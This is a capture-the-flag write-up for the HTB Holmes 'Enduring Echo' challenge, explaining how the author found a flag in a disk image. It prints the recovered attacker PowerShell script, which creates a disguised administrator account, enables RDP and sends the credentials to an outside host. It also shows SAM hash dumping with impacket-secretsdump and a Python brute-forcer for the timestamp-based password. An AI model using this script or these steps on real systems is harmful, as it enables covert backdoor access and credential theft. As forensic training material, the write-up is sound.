This was apart of the HTB Holmes CTF. I think alot of people were curious about a script / how to find this flag: 

<img width="413" height="61" alt="image" src="https://github.com/user-attachments/assets/c19ae83c-d767-4c84-be62-150ba1b5a7ab" />

```
cat ~/Desktop/The_Enduring_Echo/C/Users/Werni/AppData/Local/JM.ps1
# List of potential usernames
$usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")

# Check for existing user
$existing = $usernames | Where-Object {
    Get-LocalUser -Name $_ -ErrorAction SilentlyContinue
}

# If none exist, create a new one
if (-not $existing) {
    $newUser = Get-Random -InputObject $usernames
    $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
    $password = "Watson_$timestamp"

    $securePass = ConvertTo-SecureString $password -AsPlainText -Force

    New-LocalUser -Name $newUser -Password $securePass -FullName "Windows Update Helper" -Description "System-managed service account"
    Add-LocalGroupMember -Group "Administrators" -Member $newUser
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $newUser

    # Enable RDP
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    Invoke-WebRequest -Uri "http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
}
 
```




```
impacket-secretsdump -sam ~/Desktop/The_Enduring_Echo/C/Windows/System32/config/SAM \
                     -system ~/Desktop/The_Enduring_Echo/C/Windows/System32/config/SYSTEM LOCAL
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3a2999e73d3448fb21e14bbd9a9480d1
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:02679f6b636628c0822c7f9836b84282:::
Werni:1002:aad3b435b51404eeaad3b435b51404ee:0fa16c6a581bf468c6a83510926b8358:::
svc_netupd:1003:aad3b435b51404eeaad3b435b51404ee:532303a6fa70b02c905f950b60d7da51:::
```

```
sudo nano watson_cracker.py

import hashlib
import datetime

# Target NTLM hash
target_hash = "532303a6fa70b02c905f950b60d7da51"

def ntlm_hash(password):
    return hashlib.new('md4', password.encode('utf-16le')).hexdigest()

# Search over a broad date range (April -> Sept 2025)
start = datetime.datetime(2025, 4, 1, 0, 0, 0)
end   = datetime.datetime(2025, 9, 25, 0, 0, 0)

delta = datetime.timedelta(seconds=1)
current = start

while current <= end:
    candidate = "Watson_" + current.strftime("%Y%m%d%H%M%S")
    if ntlm_hash(candidate) == target_hash:
        print(f"[+] Match found: {candidate}")
        break
    current += delta
```


```
python3 watson_cracker.py
[+] Match found: Watson_20250824160509
```


